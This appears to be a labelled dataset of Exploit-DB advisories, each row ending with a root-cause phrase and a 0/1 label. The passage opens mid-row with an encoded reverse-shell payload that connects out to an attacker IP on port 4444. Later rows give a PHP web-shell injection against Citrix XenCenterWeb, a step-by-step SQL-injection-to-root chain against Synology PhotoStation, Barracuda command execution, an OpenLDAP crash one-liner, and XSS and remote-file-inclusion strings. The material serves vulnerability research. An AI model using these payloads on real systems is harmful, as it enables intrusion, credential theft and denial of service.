%26%31%20%7c%20%6f%70%65%6e%73%73%6c%20%73%5f%63%6c%69%65%6e%74%20%2d%71%75%69%65%74%20%2d%63%6f%6e%6e%65%63%74%20%31%39%32%2e%31%36%38%2e%31%33%33%2e%32%30%34%3a%34%34%34%34%20%3e%20%2f%74%6d%70%2f%73%3b%20%72%6d%20%2f%74%6d%70%2f%73%20%26  Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.  > Local exploitation: This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command: CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>' The cgi_main binary is located at ""/apps/surveillance/bin/cgi_main"" on the ReadyNAS and ""/NUUO/bin/cgi_main"" on the NVRmini2.  It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.   >> Fix:  NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available. Do not expose any of these devices to the Internet or any networks with unstrusted hosts.  Timeline: 28.02.2016: Disclosure to CERT/CC. 27.04.2016: Requested status update from CERT - they did not receive any response from vendors. 06.06.2016: Requested status update from CERT - still no response from vendors.             Contacted Nuuo and NETGEAR directly. NETGEAR responded with their ""Responsible Disclosure Guidelines"", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo. 13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels. 07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure. 17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received. 01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received. 04.08.2016: Coordinated disclosure with CERT.   >> References: [1] https://www.kb.cert.org/vuls/id/856152   ================ Agile Information Security Limited http://www.agileinfosec.co.uk/ >> Enabling secure digital business >>",improperly sanitises input to the log parameter,1
9106,"citrix xencenterweb - Cross-Site Scripting / SQL Injection / Remote Code Execution Secure Network - Security Research Advisory  Vuln name: Citrix XenCenterWeb Multiple Vulnerabilities  Systems affected: Citrix XenCenterWeb Systems not affected: n/a Severity: High Local/Remote: Remote Vendor URL: http://www.citrix.com Author(s): Alberto Trivero a.trivero@securenetwork.it  -    Claudio Criscione c.criscione@securenetwork.it Vendor disclosure: 1/06/2009 Vendor acknowledged: 11/06/2009 Vendor patch release: n/a Public disclosure: 06/07/2009 Advisory number: SN-2009-01 Advisory URL: http://securenetwork.it/ricerca/advisory/download/SN-2009-01.txt   *** SUMMARY ***  Citrix XenCenterWeb is a web interface for Citrix XenServer environment  management. Users of XenCenterWeb will be able to see a list of Virtual Machines in the  Resource Pool, perform life-cycle actions (start, shutdown, restart, etc.),  get basic information about the hosts in the Resource Pools, information about  the VMs and also connect to the console of the VMs.  Due to poor validation of some user controlled inputs, a variety of attacks  against the application and the underlying server are possible. Cross-site scripting, cross-site request forgery, SQL injection and remote  command execution attack vectors were identified as well.   XSS and CSRF attacks can be performed on the virtual appliance itself, while  the others require the PHP parameter magic_quotes_gpc to be off on the web  server.  *** VULNERABILITY DETAILS ***  (a) Cross-site Scripting (XSS) and Cross-site Request Forgery (CSRF) With the default PHP configuration (register_globals=Off and  magic_quotes_gpc=On), both XSS and CSRF attacks can be executed.  The first XSS attack exploits the lack of sanitization in the username  parameter in edituser.php script and requires the victim to be able to access  configuration scripts:  https://xencenterweb.loc/config/edituser.php?username=1<script>alert(document.cookie)</script>  Under the same conditions, a CSRF attack can be executed to change the  password of an arbitrary user: https://xencenterweb.loc/config/changepw.php?username=[victim_username]&newpass=[attacker's_chosen_pwd]  Another CSRF attack can hard stop a VM of the attacker's choice: https://xencenterweb.loc/hardstopvm.php?stop_vmref=[VMref]&stop_vmname=[VMname]  Other XSS vulnerabilities afflict scripts which are accessible by anyone: https://xencenterweb.loc/console.php?location=1""><script>alert(document.cookie)</script><""&vmname=myVM https://xencenterweb.loc/console.php?location=1&sessionid=1""><script>alert(123)</script><""&vmname=myVM https://xencenterweb.loc/console.php?location=1&sessionid=1&vmname=myVM<script>alert(123)</script> https://xencenterweb.loc/forcerestart.php?vmrefid=1""><script>alert(123)</script><""&vmname=myVM https://xencenterweb.loc/forcerestart.php?vmrefid=1&vmname=myVM""><script>alert(123)</script><"" https://xencenterweb.loc/forcesd.php?vmrefid=1&vmname=myVM""><script>alert(123)</script><"" https://xencenterweb.loc/forcesd.php?vmrefid=1""><script>alert(123)</script><""&vmname=myVM  (b) SQL Injection The username parameter in the login.php script is vulnerable to a Blind SQL  Injection attack. An attacker can retrieve the whole database schema through specially crafted  requests. Here is an example proof of concept: https://xencenterweb.loc/login.php?username=user' UNION SELECT if(user() LIKE  'root@%', benchmark(1000000,sha1('test')), 'false')/* Obviously, other high profile attacks can be performed through this attack  vector.  (c) Remote Command Execution An attacker could write arbitrary data in the file  /usr/local/lib/php/include/config.ini.php through the file /var/www/config/writeconfig.php. Due to this unsecure behavior,  arbitrary commands can be executed on the machine. If a victim with the proper authorization follows this link: https://xencenterweb.loc/config/writeconfig.php?pool1='; ?> <?php $cmd =  $_REQUEST['cmd']; passthru($cmd); ?> <?php $xen = ' or this URL encoded version: https://xencenterweb.loc/config/writeconfig.php?pool1=%27%3B%20%3F%3E%20%3C%3Fphp%20%24cmd%20%3D%20%24_REQUEST%5B%27cmd%27%5D%3B%20passthru%28%24cmd%29%3B%20%3F%3E%20%3C%3Fphp%20%24xen%20%3D%20%27 an attacker can then simply execute commands on the system through the  console.php file: https://xencenterweb.loc/console.php?cmd=cat%20/etc/passwd;   *** EXPLOIT ***  Attackers may exploit these issues through a common browser as explained  above.    *** FIX INFORMATION ***  No patch is currently provided by Citrix, and the application download has  been removed. Citrix officially stated that ""the tool was created to demonstrate how the SDK  could be used to create unique solutions. Customers currently using it should  assess the risks of continued use in light of your findings and, if these prove  to be unacceptable, discontinue usage"".   *** WORKAROUNDS ***  Common web application workarounds apply, like virtual patching from a web  application firewall or similar solutions. However most of the reported issues  can be mitigated by running the application only inside the virtual appliance  or in properly configured web servers.  Secure Network would like to thank Citrix for its support during the  disclosure process.   ********************* *** LEGAL NOTICES *** *********************  Secure Network (www.securenetwork.it) is an information security company,  which provides consulting and training services, and engages in security  research and development.   We are committed to open, full disclosure of vulnerabilities, cooperating whenever possible with software developers for properly handling disclosure.  This advisory is copyright 2009 Secure Network S.r.l. Permission is  hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. It  may not be edited in any way without the express consent of Secure Network  S.r.l. Permission is explicitly given for insertion in vulnerability  databases and similars, provided that due credit is given to Secure Network.  The information in the advisory is believed to be accurate at the time of  publishing based on currently available information. This information is provided as-is, as a free service to the community by Secure Network  research staff. There are no warranties with regard to this information.  Secure Network does not accept any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  If you have any comments or inquiries, or any issue with what is reported  in this advisory, please inform us as soon as possible.  E-mail: securenetwork {at} securenetwork.it GPG/PGP key: http://www.securenetwork.it/pgpkeys/Secure%20Network.asc Phone: +39 02 24126788  # milw0rm.com [2009-07-10]",poor validation of some user controlled inputs,1
2136,"Barracuda Spam Firewall 3.3.03.053 - Remote Code Execution (1) Title: Barracuda Arbitrary File Disclosure + Command Execution Severity: High (Sensitive Information Disclosure) Date: 01 August 2006 Version Affected: Barracuda Spam Firewall version 3.3.01.001 to 3.3.03.053 Discovered by: Greg Sinclair (gssincla@nnlsoftware.com)  Discovered on: 29 May 2006  Overview: Barracuda Spam Firewalls (www.barracudanetworks.com) are vulnerable to arbitrary file disclosure due to improper parameter sanitation.   Details: The Barracuda Spam Firewalls from version 3.3.01.001 to 3.3.02.053 are vulnerable to arbitrary file disclosure via the preview_email.cgi script. The /cgi- bin/preview_email.cgi script is designed to retrieve a message from the local message database on the Barracuda Spam Firewall. However, the ""file"" parameter which is passed via GET is not properly sanitized to restrict the file retrieval to the message database directories. The script looks for ""/mail/mlog"" in the file parameter but does not take into account directory transversal arguments such as "".."" The result is that any file that is accessible to the web server user is accessible from the web interface. The script does require a valid user to be logged in to perform this attack, however using the ""Barracuda Hardcoded Password Vulnerability"" (NNL-20060801-01) guest password vulnerability this restriction can easily be overcome. This particular problem is amplified by the fact that it is possible to download the full configuration file for the barracuda. The configuration file is periodically backed-up into the /tmp directory as ""/tmp/backup/periodic_config.txt.tmp"" Message confidentiality is compromised by the fact that an attacker who is able to view the message log screen (which can be done via the guest password vulnerability) can easily view any message on the system. The message logs are stored as /mail/mlog/X/Y/email_address/msgID where X is the first character of email_address, Y is the second character of email_address, email_address is the recipient's email address and msgID is the message ID assigned to the message in question. So for example if jon@smith.com received a message with messageID 1234, any user could view the message by entering /mail/mlog/j/o/jon@smith.com/1234  Proof of Concept:  https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../tmp/backup/periodic_config.txt.tmp  Command Execution by Matthew Hall <lists[at]ecsc.co.uk>  https://<deviceIP>/cgi-bin/preview_email.cgi?file=/mail/mlog/../../bin/ls%20/|  Recommendations: * Never allow your barracuda web interface to be accessible from untrusted networks (especially the Internet) * Upgrade to version 3.3.0.54 or later  Vendor Contact: 30 May 2006   - Initial Vendor Contact 24 June 2006  - Vendor replies with prospect of fix 17 July 2006  - NNL request status update, no reply 01 Aug 2006   - NNL releases vuln report, notifies vendor of release  # milw0rm.com [2006-08-07]",improper parameter sanitation,1
22717,"SPChat 0.8 Module - Remote File Inclusion source: https://www.securityfocus.com/bid/7780/info  SPChat has been reported prone to a remote file include vulnerability.  The issue presents itself due to insufficient sanitization performed on the user-supplied URI variable 'statussess' by the SPChat module. It is possible for a remote attacker to include a malicious file in a URL.  This vulnerability was reported to affect SPChat version 0.8 other versions may also be affected.   http://www.example.com/modules.php?op=modload&name=SPChat&file=index&statussess=<IFRAME%20src=""http://www.attacker.com/attack.htm""%20marginWidth=0%20marginHeight=0%20fr ameBorder=0%20width=500%20scrolling=yes%20height=500></IFRAME>  ----- Source Code For attack.htm for eg. ----- ?script> alert(document.cookie); ?/script> ----- Source Code For attack.htm -----",insufficient sanitization performed on the user-supplied URI variable 'statussess' by the SPChat module,1
43844,"Synology Photostation < 6.7.2-3429 - Multiple Vulnerabilities Synology Photostation Multiple Vulnerabilities  Vendor: Synology Product: Synology Photostation Version: <= 6.7.2-3429 Website: http://www.synology.com   ###########################################################################                      ______      ____________          __                       / ____/_  __/ / __/_  __/__  _____/ /_                     / / __/ / / / / /_  / / / _ \/ ___/ __ \                   / /_/ / /_/ / / __/ / / /  __/ /__/ / / /                            \____/\__,_/_/_/   /_/  \___/\___/_/ /_/                                                                                        GulfTech Research and Development                                                                   ########################################################################### #      Synology PhotoStation <= 6.7.2-3429 Multiple Vulnerabilities       # ###########################################################################    Released Date: 2018-01-08 Last Modified: 2017-07-22  Company Info: Synology  Version Info:                Vulnerable                Synology PhotoStation <= 6.7.2-3429   --[ Table of contents  00 - Introduction     00.1 Background  01 - SQL Injection     01.1 - Vulnerable code analysis     01.2 - Remote exploitation  02 - File Disclosure     02.1 - Vulnerable code analysis     02.2 - Remote exploitation  03 - Credit  04 - Proof of concept  05 - Solution  06 - Contact information   --[ 00 - Introduction  The purpose of this article is to detail the research that I have completed  regarding Synology PhotoStation. The issues I have discovered can be used in conjuction with one another to gain remote preauth root access to the affected Synology NAS device.  --[ 00.1 - Background  The Synology Diskstation NAS by default installs several DSM applications unless specified otherwise during setup. One of these default applications installed is PhotoStation. PhotoStation is a web based photo manager.   --[ 01 - SQL Injection  There are a number of SQL Injection issues within the PhotoStation  application. Since PhotoStation uses a PostgreSQL database exploitation is trivial since multiple statements can easily be injected.  --[ 01.1 - Vulnerable code analysis  Below is vulnerable code from /photo/include/blog/label.php which takes GPC data and uses it directly in an SQL query  ---------------------------------------------------------------------------  if($_POST['action'] == 'get_all_labels') {     echo SYNOBLOG_LABEL_GetLabelComboData($_POST['id']); } else if($_POST['action'] == ""get_article_label"" &&  isset($_POST['article_id'])) {     echo SYNOBLOG_LABEL_GetArticleRawLabel($_POST['article_id']); } else if($_POST['action'] == ""get_invalid_labels"") {     echo SYNOBLOG_LABEL_GetInvalidLabels(); } ---------------------------------------------------------------------------  Now let's have a look at any one of these functions.  ---------------------------------------------------------------------------  function SYNOBLOG_LABEL_GetArticleRawLabel($article_id) {   global $blog_str_article_label_none;      $query = ""Select label_name from blog_article_label where article_id =      "".$article_id."" order by label_name;"";     $db_result = PHOTO_DB_Query($query);      while(($row = PHOTO_DB_FetchRow($db_result))) {         if($row[0] == ""no_label"") {             continue;         }         $result[] = $row[0];     }    return json_encode($result); }  ---------------------------------------------------------------------------  As you can see from the above code the SQL injection is fairly straight forward as $article_id comes directly from the $_POST['article_id'] variable. In addition to this SQL Injection is also an SQL Injection within the /photo/include/synotheme.php file within the SYNOTHEME_GET_BKG_PIC() function due to the ""type"" parameter never being sanitized.  ---------------------------------------------------------------------------  function SYNOTHEME_GET_BKG_PIC($mode, $type) {   $show_bkg_img_key = 'photo' === $type ? 'v6_show_bkg_img' :    'show_bkg_img';   if (null == $show_bkg_img =  csSYNOPhotoMisc::GetConfigDB($mode,    $show_bkg_img_key, $type . '_config')) {     csSYNOPhotoMisc::UpdateConfigDB('theme', $show_bkg_img_key, '3',      $type . '_config');     $show_bkg_img = '3';   }  ---------------------------------------------------------------------------  In the above code the ""type"" variable is used to specify the table name within an SQL query. Unfortunately this ""type"" parameter is taken directly  from GPC data and never sanitized. No authentication is needed to exploit either of the previously mentioned SQL Injection vulnerabilities.  --[ 01.2 - Remote exploitation  Exploiting this issue is trivial, and can be achieved by simply sending a  post request containing a SQL Injection string within the ""article_id"" parameter.  ---------------------------------------------------------------------------  POST /photo/include/blog/label.php HTTP/1.1 Host: diskstation User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Accept: */* Accept-Language: en-US,en;q=0.5 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://diskstation/blog/ Content-Length: 60 Connection: close  action=get_article_label&article_id=1; SELECT version(); --   ---------------------------------------------------------------------------  The above request would successfully return the version of the PostgreSQL  database to the attacker. However, it is also possible to gain a remote  root shell with a decent bit of work by using the following steps.  ##[ STEP 00:  First we have to leverage the SQL Injection to enable the PhotoStation  authentication system. By default the PhotoStation application uses DSM to  authenticate. We need to change this so that it uses PhotoStation to  authenticate. This can be accomplished with the following query.  ---------------------------------------------------------------------------  UPDATE photo_config SET config_value=0 WHERE config_key='account_system';  ---------------------------------------------------------------------------  Now the PhotoStation authentication system should be successfully enabled  and ready for use.   ##[ STEP 01:   Once the PhotoStation authentication system is successfully enabled we can  create an admin user and authenticate as this user to escalate our current privileges from PhotoStation admin to root.  ---------------------------------------------------------------------------  INSERT INTO photo_user (userid, username, password, admin) VALUES (42,  'test', '098f6bcd4621d373cade4e832627b4f6', TRUE);  ---------------------------------------------------------------------------  We now can login as the admin user ""test"" with the password ""test"".  ##[ STEP 02:  The next step is to create a ""video"" record with a malicious ""path"" value  via SQL Injection. This ""path"" value holds the location of the file we want  to disclose as the root user. The PhotoStation admin panel is fairly secure  and does not give us many options for exploiting file handling issues.  However, the PhotoStation application trusts the ""path"" data taken  from the database when copying files, and does not validate it. We can  leverage this lack of sanity checks to copy any files we want as root to  the default photo directory.   ---------------------------------------------------------------------------  INSERT INTO video (id, path, title, container_type) VALUES (42,  '/usr/syno/etc/private/session/current.users', 'test', 'test');  ---------------------------------------------------------------------------  The above record inserted would allow an attacker to copy the sessions db  to the default photo directory once a file copy operation is triggered by  the album_util.php script. This is because the copy and move operations use the ""path"" data taken from the database as the source argument. This file will be copied with root permissions by the ""synphotoio"" binary.  ##[ STEP 03:  The next step for us is to trigger a file copy operation via album_util.php  where our malicious ""path"" value will be used by the ""synphotoio"" binary to  make a copy of the file as root in the default photo directory.  ---------------------------------------------------------------------------  POST /photo/include/photo/album_util.php HTTP/1.1 Host: diskstation User-Agent: Mozilla/5.0  Accept: */* Accept-Language: en-US,en;q=0.5 X-SYNO-TOKEN: ambru48o5nm3kpcla82j1b98s4 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Referer: http://diskstation/photo/ Content-Length: 45 Cookie: stay_login=1; PHPSESSID=c4kclpg4j3bndcpuq4pvs9of10; Connection: close  action=copy_items&video_list=42&destination=2f  ---------------------------------------------------------------------------  The above request will successfully copy the user sessions database to the default photo directory. We just have to make sure the ""video_list"" ID corresponds to the ID that we previously inserted into the database so that the ""path"" data we specified will be used in the file copy operation.  ##[ STEP 04:  For the next step we have to be slick and use a file handling bug in the  file_upload.php script to copy the file disclosed by root to the web  directory for viewing. The only reason we are able to accomplish this is  because we're allowed to specify the full URL sent to a file_get_contents()  call. We could also use this bug to read any file that the web server has  access to. But, for now we will just copy the file we recently disclosed as  root since these particular file handling operations take place as an  unprivileged user and would limit the attacker impact greatly.  ---------------------------------------------------------------------------  POST /photo/include/file_upload.php?dir=2f2e2e2f4061707073746f72652f50686f7 46f53746174696f6e2f70686f746f2f&name=1/&fname=pwn&sid=ambru48o5nm3 HTTP/1.1 Host: diskstation User-Agent: Mozilla/5.0  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: PHPSESSID=ambru48o5nm3; photo_remember_me=1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 57  action=aviary_add&url=file:///volume1/photo/current.users  ---------------------------------------------------------------------------  As you can see from the above request we are allow to specify a file:// URL and as a result copy the disclosed sessions db to the web directory as a  file named pwn.jpg and view all admin sessions. If it was not for this file handling bug in file_upload.php an attacker would have to access the file  via SMB or some other method thus making the attack much more complicated.  ##[ STEP 05:  Once we have the sessions database we now have the session ID and IP addresses of administrators. We can use this information to now login to the DSM as an admin. It is possible to use headers such as ""Client-IP"" to  successfully forge the IP address of the stolen session data. So, the fact  that sessions are restricted by IP address does not really matter at all in this particular case.  At this point it is game over as DSM admin users are able to run commands as root and have complete and total access to the entire system.   --[ 02 - File Disclosure  PhotoStation is vulnerable to a file disclosure issue. This issue is due to an unsafe file_get_contents() call within the SYNOPHOTO_AVIARY_Add()  function that allows an attacker to specify the full URL used.  --[ 01.1 - Vulnerable code analysis  Below is vulnerable code from /photo/include/file_upload.php which makes  use of a user supplied URL to populate the contents of $image_data.  ---------------------------------------------------------------------------  $image_data = file_get_contents($_REQUEST['url']);  ---------------------------------------------------------------------------  The above code allows authenticated users to easily disclose file contents with the privilege of the web server, or to possibly conduct SSRF attacks  against the internal network.  --[ 01.2 - Remote exploitation  Exploiting the issue requires user authentication, but other than that it is fairly trivial to take advantage of. Also, it should be noted that the required authentication can be acquired by using the previously mentioned SQL Injection issues in order to create arbitrary user accounts.  ---------------------------------------------------------------------------  POST /photo/include/file_upload.php?dir=2f2e2e2f4061707073746f72652f50686f7 46f53746174696f6e2f70686f746f2f&name=1/&fname=pwn&sid=ambru48o5nm3 HTTP/1.1 Host: diskstation User-Agent: Mozilla/5.0  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Cookie: PHPSESSID=ambru48o5nm3; photo_remember_me=1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 57  action=aviary_add&url=file:///etc/passwd  ---------------------------------------------------------------------------  The above request would successfully copy the contents of the passwd file to http://diskstation/photo/pwn.jpg where it's contents could be viewed by  the attacker.   --[ 03 - Credit  James Bercegay GulfTech Research and Development   --[ 04 - Proof of concept  We strive to do our part to contribute to the security community. Metasploit modules for issues outlined in this paper can be found online.   --[ 05 - Solution  These issues were addressed in update 6.7.3-3432  --[ 06 - Contact information  Web https://gulftech.org/  Mail security@gulftech.org   Copyright 2018 GulfTech Research and Development. All rights reserved.",an unsafe file_get_contents() call,1
26547,PHPPost 1.0 - 'mail.php?user' Cross-Site Scripting source: https://www.securityfocus.com/bid/15524/info   PHP-Post is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. The attacker may also be able to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/phpp/mail.php?user='%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E,the application fails to properly sanitize user-supplied input,1
38145,"OpenLDAP 2.4.42 - ber_get_next Denial of Service # Exploit Title: OpenLDAP 2.4.42 ber_get_next DOS # Date: 11/09/15 # Exploit Author: Denis Andzakovic - Security-Assessment.com # Vendor Homepage: http://www.openldap.org/ # Software Link: ftp://ftp.openldap.org/pub/OpenLDAP/openldap-release/openldap-2.4.42.tgz # Version: <= 2.4.42 # Tested on: Debian 8  (    , )     (,   .   '.' ) ('.    ',    ). , ('.   ( ) (   (_,) .'), ) _ _,  /  _____/  / _  \    ____  ____   _____  \____  \==/ /_\  \ _/ ___\/  _ \ /     \  /       \/   |    \\  \__(  <_> )  Y Y  \ /______  /\___|__  / \___  >____/|__|_|  /         \/         \/.-.    \/         \/:wq                     (x.0)                   '=.|w|.='                   _=''""''=.                  presents.. OpenLDAP get_ber_next Denial of Service Affected Versions: OpenLDAP <= 2.4.42  PDF: http://www.security-assessment.com/files/documents/advisory/OpenLDAP-ber_get_next-Denial-of-Service.pdf  +-------------+ | Description | +-------------+ By sending a crafted packet, an attacker may cause the OpenLDAP server to reach an assert() statement, crashing  the daemon. This was tested on OpenLDAP 2.4.42 (built with GCC 4.9.2) and OpenLDAP 2.4.40 installed from the Debian  package repository.  +--------------+ | Exploitation | +--------------+ By sending a crafted packet, an attacker can cause the OpenLDAP daemon to crash with a SIGABRT. This is due to an  assert() call within the ber_get_next method (io.c line 682) that is hit when decoding tampered BER data.   The following proof of concept exploit can be used to trigger the condition:  --[ Exploit POC echo ""/4SEhISEd4MKYj5ZMgAAAC8="" | base64 -d | nc -v 127.0.0.1 389  The above causes slapd to abort as follows when running with '-d3', however it should be noted that this will crash the server even when running in daemon mode.   --[ sladp -d3 55f0b36e slap_listener_activate(7):  55f0b36e >>> slap_listener(ldap:///) 55f0b36e connection_get(15): got connid=1000 55f0b36e connection_read(15): checking for input on id=1000 ber_get_next ldap_read: want=8, got=8   0000:  ff 84 84 84 84 84 77 83                            ......w.           55f0b36e connection_get(15): got connid=1000 55f0b36e connection_read(15): checking for input on id=1000 ber_get_next ldap_read: want=1, got=1   0000:  0a                                                 .                  55f0b36e connection_get(15): got connid=1000 55f0b36e connection_read(15): checking for input on id=1000 ber_get_next slapd: io.c:682: ber_get_next: Assertion `0' failed.  The following GDB back trace provides further information as to the location of the issue.  --[ back trace program received signal SIGABRT, Aborted. [Switching to Thread 0x7ffff2e4a700 (LWP 1371)] 0x00007ffff6a13107 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56 56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) bt #0  0x00007ffff6a13107 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56 #1  0x00007ffff6a144e8 in __GI_abort () at abort.c:89 #2  0x00007ffff6a0c226 in __assert_fail_base (fmt=0x7ffff6b42ce8 ""%s%s%s:%u: %s%sAssertion `%s' failed.\n%n"", assertion=assertion@entry=0x55f280 ""0"", file=file@entry=0x59bdb1 ""io.c"",      line=line@entry=682, function=function@entry=0x59bf33 <__PRETTY_FUNCTION__.6337> ""ber_get_next"") at assert.c:92 #3  0x00007ffff6a0c2d2 in __GI___assert_fail (assertion=assertion@entry=0x55f280 ""0"", file=file@entry=0x59bdb1 ""io.c"", line=line@entry=682,      function=function@entry=0x59bf33 <__PRETTY_FUNCTION__.6337> ""ber_get_next"") at assert.c:101 #4  0x000000000053261a in ber_get_next (sb=0x7fffe40008c0, len=0x7ffff2e49b40, ber=0x7fffe4000a00) at io.c:682 #5  0x0000000000420b56 in connection_input (cri=<optimized out>, conn=<optimized out>) at connection.c:1572 #6  connection_read (cri=<optimized out>, s=<optimized out>) at connection.c:1460 #7  connection_read_thread (ctx=0x7ffff2e49b90, argv=0xf) at connection.c:1284 #8  0x000000000050c871 in ldap_int_thread_pool_wrapper (xpool=0x8956c0) at tpool.c:696 #9  0x00007ffff6d8f0a4 in start_thread (arg=0x7ffff2e4a700) at pthread_create.c:309 #10 0x00007ffff6ac404d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111  +----------+ | Solution | +----------+ This issue has been resolved by commit 6fe51a9ab04fd28bbc171da3cf12f1c1040d6629 in git://git.openldap.org/openldap.git  +----------+ | Timeline | +----------+  10/09/15 - Issue raised on OpenLDAP issue tracker, marked as a ‘minor’ security issue, as per the requirements in the ITS, making the issue public. 10/09/15 - Patch pushed to OpenLDAP master branch by Howard Chu, commit 6fe51a9ab04fd28bbc171da3cf12f1c1040d6629 10/09/15 - Release of this advisory document.  +-------------------------------+ | About Security-Assessment.com | +-------------------------------+  Security-Assessment.com is Australasia's leading team of Information Security consultants specialising in providing high quality Information Security  services to clients throughout the Asia Pacific region. Our clients include some of the largest globally recognised companies in areas such as finance, telecommunications, broadcasting, legal and government. Our aim is to provide the very best independent advice and a high level of technical expertise while creating long and lasting professional relationships with our clients.  Security-Assessment.com is committed to security research and development, and its team continues to identify and responsibly publish vulnerabilities in public and private software vendor's products. Members of the  Security-Assessment.com R&D team are globally recognised through their release of whitepapers and presentations related to new security research.  For further information on this issue or any of our service offerings,  contact us:  Web www.security-assessment.com Email info () security-assessment com Phone +64 4 470 1650",data,0
35064,Zimplit CMS - 'English_manual_version_2.php?client' Cross-Site Scripting source: https://www.securityfocus.com/bid/45252/info   Zimplit CMS is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/path/English_manual_version_2.php?client=c%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,fails to properly sanitize user-supplied input,1
31393,"Jeebles Directory 2.9.60 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/28221/info  Jeebles Directory is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/Jeebles_Directory/?path=""><script>alert()</script> http://www.example.com/Jeebles_Directory/?path=subdirectory/""><script>alert(document.cookie)</script> http://www.example.com/Jeebles_Directory/subdirectory/index.php?path=""><script>alert(document.cookie)</script> http://www.example.com/Jeebles_Directory/index.php?administration&access_login=-1&access_password=<br%20/><b>Notice</b>:%20%20Undefined%20index:%20%20access_password%20in%20<b>c:\program%20files\easyphp1-8\www\jeebles_directory\describe.php</b>%20on%20line%20<b>62</b><br%20/>&path=<br%20/><b>Notice</b>:%20%20Use%20of%20undefined%20constant%20path%20-%20assumed%20&#039;path&#039;%20in%20<b>c:\program%20files\easyphp1-8\www\jeebles_directory\describe.php</b>%20on%20line%20<b>62</b><br%20/><br%20/><b>Notice</b>:%20%20Undefined%20index:%20%20path%20in%20<b>""><script>alert(document.cookie)</script></b>%20on%20line%20<b>62</b><br%20/>",fails to sufficiently sanitize user-supplied data,1
28533,Telekorn Signkorn Guestbook 1.x - '/help/de/adminhelp1.php?dir_path' Remote File Inclusion source: https://www.securityfocus.com/bid/19977/info             Telekorn Signkorn Guestbook is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.             This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.             Versions 1.3 and earlier are affected by this issue.  http://www.example.Com/[Script]/help/de/adminhelp1.php?dir_path=[U r Evil Script] ;,fails to sufficiently sanitize user-supplied data,1
22576,"Microsoft SQL Server 7.0/2000 JET Database Engine 4.0 - Buffer Overrun source: https://www.securityfocus.com/bid/7541/info  Microsoft SQL Server is prone to an exploitable buffer overrun vulnerability via the Jet Database Engine. This can occur while the JET 4.0 OLE DB data provider is querying data supplied via a remote source and is due to insufficient bounds checking of parameters of heterogeneous or ad hoc query methods.  select * from openrowset('microsoft.jet.oledb.4.0','c:\anydatabase.mdb';'admin';'','select XXX...()')  or  select * from Openquery(SomeJet40LinkedServer,'Select XXX...()')   (where XXX... is more than 276 chars)",insufficient bounds checking of parameters of heterogeneous or ad hoc query methods,1
29413,Magic Photo Storage Website - '/admin/delete_member.php?_config[site_path]' Remote File Inclusion source: https://www.securityfocus.com/bid/21965/info        Magic Photo Storage Website is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.        Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  http://www.example.com/path/admin/delete_member.php?_config[site_path]=http://www.example2.com,fails to sufficiently sanitize user-supplied data,1
24818,"Digital Illusions CE Codename Eagle - Remote Denial of Service source: https://www.securityfocus.com/bid/11887/info  A remote denial of service vulnerability reportedly affects Digital Illusions CE Codename Eagle. This issue is due to a failure of the application to properly handle exceptional network data.  An attacker may leverage this issue to cause the affected application to stop responding to network-based messages, effectively denying service to legitimate, remote users. Due to the nature of the network protocol used by the affected application an attacker may spoof their network identity, facilitating anonymous exploitation.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/24818.zip",a failure of the application to properly handle exceptional network data,1
